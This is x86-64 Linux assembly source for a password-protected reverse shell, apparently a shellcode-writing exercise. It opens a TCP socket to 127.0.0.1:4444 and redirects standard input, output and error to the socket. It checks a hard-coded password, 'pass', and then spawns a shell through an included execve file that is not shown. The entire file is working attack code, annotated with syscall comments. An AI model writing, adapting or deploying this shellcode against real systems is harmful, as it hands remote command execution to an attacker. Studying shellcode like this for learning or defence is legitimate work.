global _start

%define _START
_start:
    jmp real_start
    password: db "pass"
    pass_len: db $-password

real_start:
socket:
    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; __NR_socket = 41
    ; On success, a file descriptor for the new socket is returned

    push 41
    pop rax
    push 2
    pop rdi
    push 1
    pop rsi
    cdq       ; copies rax's bit 31 to all bits of edx (zeroes rdx)
    syscall

    push rax
    pop rdi

connect:
    ; server.sin_family = AF_INET;    short
    ; server.sin_port = htons(4444);    unsigned short
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1");    unsigned long
    ; bzero(&server.sin_zero, 8);
    ; AF_INET = 2
    ;
    ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
    ; struct sockaddr_in {
    ;     short            sin_family;
    ;     unsigned short   sin_port;
    ;     struct in_addr   sin_addr;
    ;     char             sin_zero[8];
    ; };
    ;
    ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
    ; __NR_connect = 42

    xor rax, rax
    push rax          ; bzero()
    mov dword [rsp-4], 0x0100007f
    sub rsp, 4
    push word 0x5c11  ; htons(4444)
    push word 2

    ; connect
    mov rax, 42
    mov rsi, rsp
    mov rdx, 16  ; sizeof(sockaddr_in)
    syscall

dup2:
    ; dup2(sock, 0);
    ; dup2(sock, 1);
    ; dup2(sock, 2);
    ; __NR_dup2 = 33

    mov rax, 33
    xor rsi, rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

read_password:
    ; read(int fd, void *buf, size_t count)
    ; On success, the number of bytes read is returned

    xor eax, eax
    ;rdi = "sock"  ; already done
    push rax
    push rax       ; create space for "buf" in the stack
    push rsp
    pop rsi        ; rsi = *buf
    mov dl, 16
    syscall

compare_password:
    xor ecx, ecx
    mov cl, [rel pass_len]
    lea rdi, [rel password]
    cld
    repz cmpsb
    jne exit

execve:
    %include "execve-stack.nasm"

exit:
    ;xor eax, eax  ; upper bytes are zero after read
    mov al, 60
    syscall
